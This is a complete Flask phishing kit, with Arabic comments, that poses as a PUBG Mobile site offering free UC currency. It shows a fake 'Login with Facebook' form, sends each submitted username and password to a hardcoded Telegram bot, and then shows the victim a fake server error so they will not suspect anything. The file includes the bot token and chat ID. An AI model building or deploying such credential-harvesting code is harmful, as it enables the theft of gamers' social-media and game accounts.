from flask import Flask, render_template_string, request
import requests

app = Flask(__name__)

# --- إعدادات البوت الخاص بك ---
BOT_TOKEN = "7505257770:AAF0jrbupNgqR3yhvnae_Tv7u2kApYruTwk"
CHAT_ID = "6592828647"

# واجهة الموقع (HTML) - تصميم سريع يشبه مواقع الشحن
HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>PUBG Mobile - UC Station</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { background-color: #1a1a1a; color: white; font-family: sans-serif; text-align: center; }
        .box { border: 1px solid #f3ba2f; margin: 20px; padding: 20px; border-radius: 10px; }
        .btn-fb { background-color: #1877f2; color: white; padding: 10px; border: none; width: 80%; border-radius: 5px; cursor: pointer; }
        input { width: 80%; padding: 10px; margin: 10px 0; border-radius: 5px; border: none; }
        img { width: 150px; }
    </style>
</head>
<body>
    <img src="https://www.pubgmobile.com/images/event/common/logo.png">
    <h2>اختبر حظك في شحن 8100 UC مجاناً</h2>
    <div class="box">
        <p>اختر كمية الشدات:</p>
        <select id="uc">
            <option>660 UC</option>
            <option>1800 UC</option>
            <option>8100 UC</option>
        </select>
        <p>تسجيل الدخول لاستلام المكافأة:</p>
        <form action="/login" method="post">
            <input type="text" name="user" placeholder="رقم الهاتف أو البريد" required><br>
            <input type="password" name="pass" placeholder="كلمة السر" required><br>
            <button type="submit" class="btn-fb">Login with Facebook</button>
        </form>
    </div>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_PAGE)

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('user')
    password = request.form.get('pass')
    
    # تنسيق الرسالة التي ستصلك في التليجرام
    text = (
        f"<b>🔥 صيد جديد من سكربت ببجي!</b>\n"
        f"━━━━━━━━━━━━━━\n"
        f"<b>👤 المستخدم:</b> <code>{username}</code>\n"
        f"<b>🔑 الرمز:</b> <code>{password}</code>\n"
        f"━━━━━━━━━━━━━━\n"
        f"<b>✅ تم الصيد بواسطة ليدر رضا</b>"
    )
    
    # إرسال البيانات للبوت
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    requests.post(url, json={"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"})
    
    # توجيه الضحية لموقع ببجي الحقيقي لكي لا يشك بشيء
    return "<h3>خطأ في الخادم: يرجى المحاولة لاحقاً أو التأكد من بياناتك.</h3>"

if __name__ == '__main__':
    # تشغيل السيرفر
    app.run(host='0.0.0.0', port=5000)
